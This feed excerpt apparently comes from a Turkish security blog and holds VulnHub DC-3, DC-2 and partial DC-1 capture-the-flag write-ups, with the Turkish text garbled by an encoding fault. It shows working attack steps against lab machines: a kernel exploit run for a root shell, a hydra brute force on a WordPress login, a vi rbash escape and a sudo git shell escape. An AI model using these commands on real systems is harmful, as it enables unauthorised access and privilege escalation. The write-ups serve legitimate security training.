<pre><code class="language-terminal" data-lang="terminal">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls -lsa
ls -lsa
total 28
4 drwxr-x--- 2 www-data www-data 4096 Apr 26  2016 .
4 drwxr-xr-x 4 www-data www-data 4096 Sep 29 08:29 ..
4 -rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh
8 -rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c
4 -rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c
4 -rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.c
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)&quot;&quot;
               ^
</code></pre><p>Derleme sonucu oluÅŸturulan binary dosyasÄ± Ã§alÄ±ÅŸtÄ±rÄ±larak yetki yÃ¼kseltme iÅŸlemi tamamlanÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
cd /root
root@DC-3:/root# ls
ls
the-flag.txt
</code></pre>
    <img src="/images/vulnhub/dc3/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB DC-2 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-2-write-up/</link>
            <pubDate>Mon, 28 Sep 2020 14:55:50 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-2-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan DC-2 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip; ğŸ˜Š
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth1  Nmap ile portlar ve portlarda Ã§alÄ±ÅŸan servisler tespit edilir.
sudo nmap -sV -sC -p- 192.168.56.109  192.168.56.109 dc-2 /etc/hosts dosyasÄ±na eklenir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/dc-2,311/">VULNHUB</a> &lsquo;da yer alan DC-2 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip; ğŸ˜Š</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/dc2/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap ile portlar ve portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.109
</code></pre></div>
    <img src="/images/vulnhub/dc2/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><code>192.168.56.109   dc-2</code> <strong>/etc/hosts</strong> dosyasÄ±na eklenir. 80 portunda Ã§alÄ±ÅŸan web servisine tarayÄ±cÄ±ndan istek atÄ±lÄ±r. Wordpress uygulamasÄ±nÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/dc2/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Site iÃ§erisinde yer alan flag sekmesine tÄ±klanarak ilk flag elde edilir.</p>

    <img src="/images/vulnhub/dc2/flag1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Rockyou wordlistinin bir iÅŸe yaramayacaÄŸÄ± ile ilgili bir not bÄ±rakÄ±lmÄ±ÅŸ gÃ¶zÃ¼kÃ¼yor. <strong>Cewl</strong> aracÄ± kullanÄ±larak web sitesinde yer alan metinlerden wordlist oluÅŸturulur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cewl -d <span style="color:#ae81ff">3</span> -m <span style="color:#ae81ff">5</span> http://dc-2/ -w Wordlist_dc_2.lst
<span style="color:#75715e"># -d derinlik</span> 
<span style="color:#75715e"># -m minumum kelime uzunluÄŸu</span>
</code></pre></div><p>OluÅŸturulan wordlistin bir kÄ±smÄ± aÅŸaÄŸÄ±daki gibidir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">â”€[barcode@parrot]â”€[~]$ cat Wordlist_dc_2.lst 
vitae
luctus
content
Donec
turpis
Aenean
tincidunt
finibus
dictum
egestas
volutpat
...
...
</code></pre></div><p>Web dizin taramasÄ± gerÃ§ekleÅŸtilir. Wordpress dosyalarÄ± haricinde herhangi bir farklÄ± dosya gÃ¶rÃ¼lmemektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://dc-2/ -w /usr/share/wordlists/dirb/big.txt -x .php,.txt
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://dc-2/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/09/25 07:46:56 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/index.php (Status: 301)
/license.txt (Status: 200)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-config.php (Status: 200)
/wp-login.php (Status: 200)
/wp-trackback.php (Status: 200)
===============================================================
2020/09/25 07:47:09 Finished

</code></pre><p>Wordpress iÃ§in kullanÄ±lan wpscan aracÄ± ile tarama gerÃ§ekleÅŸtirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://dc-2/ --enumerate
</code></pre></div><p>Tarama sonucunda 3 adet kullanÄ±cÄ± adÄ± tespit edilir. AyrÄ±ca wordpress sÃ¼rÃ¼mÃ¼nÃ¼n 4.7.10 olduÄŸu gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/dc2/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Elde edilen kullanÄ±cÄ± adlarÄ± ile user.txt adÄ±nda bir wordlist oluÅŸturulur. Daha sonra hydra aracÄ± ile wordpress admin paneline brute-force saldÄ±rÄ±sÄ± yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -L user.txt -P ./Wordlist_dc_2.lst dc-2 -V http-form-post <span style="color:#e6db74">&#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</span>
</code></pre></div>
    <img src="/images/vulnhub/dc2/tom.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/vulnhub/dc2/jerry.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Jerry kullanÄ±cÄ±sÄ± ile login olunur. Pages sekmesine tÄ±klanÄ±r ve mevcut sayfalar listelenir.</p>

    <img src="/images/vulnhub/dc2/pages.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Flag2 sayfasÄ±na tÄ±klanÄ±r. <em><strong>(Wordpress 4.7.10 sÃ¼rÃ¼mÃ¼nde gizli sayfalarÄ±n gÃ¶rÃ¼ntÃ¼lenmesini saÄŸlayan bir zafiyet bulunmaktadÄ±r. http://dc-2/?static=1&amp;order=asc)</strong></em></p>

    <img src="/images/vulnhub/dc2/flag2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Daha sonra dosya media sekmesinden dosya upload edilemeye Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda kullanÄ±cÄ±nÄ±n buna yetkili olmadÄ±ÄŸÄ± tespit edilir. ğŸ˜£</p>

    <img src="/images/vulnhub/dc2/notupload.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Elde edilen parola bilgileri ssh servisinde denenir ve tom kullanÄ±cÄ± iÃ§in ssh baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -p <span style="color:#ae81ff">7744</span> tom@192.168.56.109
</code></pre></div>
    <img src="/images/vulnhub/dc2/ssh.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Terminal ekranÄ±nda cd vb. birÃ§ok komut Ã§alÄ±ÅŸtÄ±rÄ±lamamaktadÄ±r. Shell tÃ¼rÃ¼ne bakÄ±ldÄ±ÄŸÄ±nda rbash olduÄŸu gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/dc2/bash.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ä°lk olarak Ã§alÄ±ÅŸtÄ±rÄ±labilir komutlar tespit edilir. Dizinde listeleme yapÄ±lÄ±r. AyrÄ±ca <code>echo $PATH</code> komutu ile path dizini tespit edilir. <em><strong>/home/tom/usr/bin</strong></em> klasÃ¶rÃ¼ iÃ§erisinde tom kullanÄ±cÄ±sÄ±n Ã§alÄ±ÅŸtÄ±rabileceÄŸi komutlar yer almaktadÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tom@DC-2:~$ cd usr
-rbash: cd: restricted

tom@DC-2:~$ ls -lsa
total <span style="color:#ae81ff">76</span>
 <span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom  tom   <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">28</span> 07:19 .
 <span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ..
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom   <span style="color:#ae81ff">1200</span> Sep <span style="color:#ae81ff">28</span> 07:38 .bash_history
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_login
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_logout
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_profile
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bashrc
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">95</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> flag3.txt
 <span style="color:#ae81ff">4</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">79</span> Sep <span style="color:#ae81ff">28</span> 07:31 .lesshst
 <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .profile
<span style="color:#ae81ff">12</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom  <span style="color:#ae81ff">12288</span> Sep <span style="color:#ae81ff">27</span> 13:32 .swo
<span style="color:#ae81ff">12</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom  <span style="color:#ae81ff">12288</span> Sep <span style="color:#ae81ff">27</span> 13:13 .swp
 <span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom  tom   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> usr

tom@DC-2:~$ ls -lsa usr
total <span style="color:#ae81ff">12</span>
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">28</span> 07:19 ..
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">2</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> bin

tom@DC-2:~$ ls -lsa usr/bin
total <span style="color:#ae81ff">8</span>
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">2</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ..
<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">13</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> less -&gt; /usr/bin/less
<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom    <span style="color:#ae81ff">7</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ls -&gt; /bin/ls
<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">12</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> scp -&gt; /usr/bin/scp
<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">11</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> vi -&gt; /usr/bin/vi
</code></pre></div><p>Vi uygulamasÄ± iÃ§erisinden bash set edilerek shell deÄŸiÅŸtirilebilmektedir. Vi uygulamasÄ± aÃ§Ä±lÄ±r. AÅŸaÄŸÄ±da yer alan komutlar sÄ±ra ile girilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">:set shell=/bin/bash
:shell
</code></pre></div><p>iÅŸlem sonunda bash kabuÄŸuna geÃ§ilir.  PATH deÄŸiÅŸkeni /bin ve /usr/bin olacak ÅŸekilde ayarlanÄ±r.</p>

    <img src="/images/vulnhub/dc2/path.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Daha sonra tom kullanÄ±cÄ±sÄ±nÄ±n home dizininde yer alan flag3.txt okunur.</p>

    <img src="/images/vulnhub/dc2/flag3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Jerry kullanÄ±cÄ±sÄ±nÄ±n home dizininde yer alan flag4.txt okunur.</p>

    <img src="/images/vulnhub/dc2/flag4.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Sudo -l komutu ile <strong>Tom</strong> kullanÄ±cÄ±sÄ±nÄ±n yetkileri kontrol edildiÄŸinde sudo grubuna Ã¼ye olmadÄ±ÄŸÄ±/sudoers dosyasÄ±nda bulunmadÄ±ÄŸÄ± tespit edilir. Jerry kullacÄ±sÄ±na <code>su jerry</code> ile geÃ§iÅŸ yapÄ±lÄ±r. Parola bilgisi olarak wordpress panel giriÅŸ ÅŸifresi denendiÄŸinde baÅŸarÄ±lÄ± olunur. ğŸ˜</p>
<p>Jerry kullanÄ±cÄ±sÄ± iÃ§in sudo yetkileri kontrol edildiÄŸinde, git uygulamasÄ±nÄ± parola girmeden root yetkisi ile Ã§alÄ±ÅŸtÄ±rabildiÄŸi gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/dc2/git.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Git uygulamasÄ± sudo yetkisi ile Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve aÅŸaÄŸÄ±da yeralan komutlar girilerek yÃ¼ksek yetkili bash kabuÄŸuna geÃ§ilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo git help config
!/bin/bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@DC-2:/# cd /root
root@DC-2:~# ls -lsa
total <span style="color:#ae81ff">32</span>
<span style="color:#ae81ff">4</span> drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">21</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> ..
<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">207</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_history
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">570</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2010</span> .bashrc
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">427</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> final-flag.txt
<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">46</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .lesshst
<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">232</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .mysql_history
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">140</span> Nov <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2007</span> .profile
</code></pre></div><p>final-flag.txt deÄŸeri okunarak Ã§Ã¶zÃ¼m iÅŸlemi tamalanÄ±r.</p>

    <img src="/images/vulnhub/dc2/finalflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB DC-1 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-1-write-up/</link>
            <pubDate>Sat, 26 Sep 2020 15:05:32 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-1-write-up/</guid>
            <description>Merhaba, VULNHUB &amp;lsquo;da yer alan DC-1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼yle karÅŸÄ±nÄ±zdayÄ±m. Keyifli okumalar&amp;hellip;
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth1  Ä°p adresi tespit edildikten sonra nmap ile makinenin tÃ¼m portlarÄ± taranÄ±r. AÃ§Ä±k portlarda Ã§alÄ±ÅŸan servisler tespit edilir.
sudo nmap -sV -sC -p- 192.168.56.107  80 portunda Ã§alÄ±ÅŸan web servisine tarayÄ±cÄ±ndan istek atÄ±lÄ±r.</description>
            <content type="html"><![CDATA[<p>Merhaba, <a href="https://www.vulnhub.com/entry/dc-1,292/">VULNHUB</a> &lsquo;da yer alan DC-1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼yle karÅŸÄ±nÄ±zdayÄ±m. Keyifli okumalar&hellip;</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/dc1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>Ä°p adresi tespit edildikten sonra nmap ile makinenin tÃ¼m portlarÄ± taranÄ±r. AÃ§Ä±k portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.107
</code></pre></div>
    <img src="/images/vulnhub/dc1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>80 portunda Ã§alÄ±ÅŸan web servisine tarayÄ±cÄ±ndan istek atÄ±lÄ±r. AyrÄ±ca http-generator  bilgisinde Drupal 7 yazmaktadÄ±r. Google ile yapÄ±lan aramada CMS yazÄ±lÄ±mÄ± olduÄŸu gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/dc1/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>Web dizin taramasÄ± gerÃ§ekleÅŸtirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirb/common.txt
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://192.168.56.107
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
<span style="color:#f92672">===============================================================</span>
2020/09/24 10:03:45 Starting gobuster
<span style="color:#f92672">===============================================================</span>
/.history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.hta <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.bash_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.git/HEAD <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.forward <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.cvsignore <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.cvs <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.config <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.cache <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.bashrc <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.perf <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.passwd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.profile <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.mysql_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.rhosts <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.listings <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.svn/entries <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.svn <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.subversion <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.ssh <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.listing <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.sh_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.web <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.swf <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/0 <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/admin <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/Admin <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/ADMIN <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/batch <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/cgi-bin/ <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/Entries <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/includes <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/install.mysql <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/install.pgsql <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/LICENSE <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/misc <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/modules <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
